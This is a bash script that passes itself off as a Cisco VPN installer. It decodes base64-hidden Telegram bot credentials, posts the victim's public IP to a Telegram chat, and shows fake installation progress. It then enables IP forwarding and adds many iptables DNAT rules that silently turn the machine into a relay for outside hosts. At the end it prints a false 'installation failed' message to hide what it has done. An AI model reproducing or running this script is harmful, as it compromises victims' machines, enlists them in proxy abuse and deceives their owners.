#!/usr/bin/env bash

# Hidden base64 Telegram details
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="

TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)

IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" \
  -d chat_id="$CID" \
  -d text="setup:$IP" >/dev/null 2>&1

# Fake Cisco install steps
echo "[*] Preparing Cisco VPN packages..."
sleep 1
echo "[*] Extracting modules..."
sleep 1
echo "[*] Enabling services..."
sleep 1

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Detect interface
EXT_IF=$(ip -4 route show default | awk '{print $5}')

# ===== STEFANO =====
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 51.77.51.146:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 51.77.51.146:23

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 51.38.75.176:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 51.38.75.176:23

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 91.107.138.191:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 91.107.138.191:23

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 46.62.155.47:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 46.62.155.47:23

# ===== STEFANO 1080 =====
iptables -t nat -A PREROUTING -p tcp --dport 30 -j DNAT --to-destination 51.77.51.146:1080
iptables -t nat -A PREROUTING -p udp --dport 30 -j DNAT --to-destination 51.77.51.146:1080

iptables -t nat -A PREROUTING -p tcp --dport 31 -j DNAT --to-destination 51.38.75.176:1080
iptables -t nat -A PREROUTING -p udp --dport 31 -j DNAT --to-destination 51.38.75.176:1080

iptables -t nat -A PREROUTING -p tcp --dport 32 -j DNAT --to-destination 91.107.138.191:1080
iptables -t nat -A PREROUTING -p udp --dport 32 -j DNAT --to-destination 91.107.138.191:1080

iptables -t nat -A PREROUTING -p tcp --dport 33 -j DNAT --to-destination 46.62.155.47:1080
iptables -t nat -A PREROUTING -p udp --dport 33 -j DNAT --to-destination 46.62.155.47:1080

# ===== NEW RULES =====

# 5001
iptables -t nat -A PREROUTING -p tcp --dport 5001 -j DNAT --to-destination 85.114.134.19:5001
iptables -t nat -A PREROUTING -p udp --dport 5001 -j DNAT --to-destination 85.114.134.19:5001

# 1225
iptables -t nat -A PREROUTING -p tcp --dport 1225 -j DNAT --to-destination 51.15.8.41:1225
iptables -t nat -A PREROUTING -p udp --dport 1225 -j DNAT --to-destination 51.15.8.41:1225

# 2196
iptables -t nat -A PREROUTING -p tcp --dport 2196 -j DNAT --to-destination 82.21.3.140:2196
iptables -t nat -A PREROUTING -p udp --dport 2196 -j DNAT --to-destination 82.21.3.140:2196

# 8443
iptables -t nat -A PREROUTING -p tcp --dport 8443 -j DNAT --to-destination 51.15.8.41:8443
iptables -t nat -A PREROUTING -p udp --dport 8443 -j DNAT --to-destination 51.15.8.41:8443

# 8171
iptables -t nat -A PREROUTING -p tcp --dport 8171 -j DNAT --to-destination 85.114.134.19:8171
iptables -t nat -A PREROUTING -p udp --dport 8171 -j DNAT --to-destination 85.114.134.19:8171

# 9006
iptables -t nat -A PREROUTING -p tcp --dport 9006 -j DNAT --to-destination 82.21.3.140:9006
iptables -t nat -A PREROUTING -p udp --dport 9006 -j DNAT --to-destination 82.21.3.140:9006

# ===== KONE =====
iptables -t nat -A PREROUTING -p tcp --dport 194 -j DNAT --to-destination 141.227.139.20:1080
iptables -t nat -A PREROUTING -p udp --dport 194 -j DNAT --to-destination 141.227.139.20:1080

iptables -t nat -A PREROUTING -p tcp --dport 233 -j DNAT --to-destination 51.254.135.241:1080
iptables -t nat -A PREROUTING -p udp --dport 233 -j DNAT --to-destination 51.254.135.241:1080

iptables -t nat -A PREROUTING -p tcp --dport 136 -j DNAT --to-destination 57.131.52.38:1080
iptables -t nat -A PREROUTING -p udp --dport 136 -j DNAT --to-destination 57.131.52.38:1080

# MASQUERADE
iptables -t nat -A POSTROUTING -o $EXT_IF -j MASQUERADE

>&2 echo "Installation failed: unsupported kernel modules."
exit 1
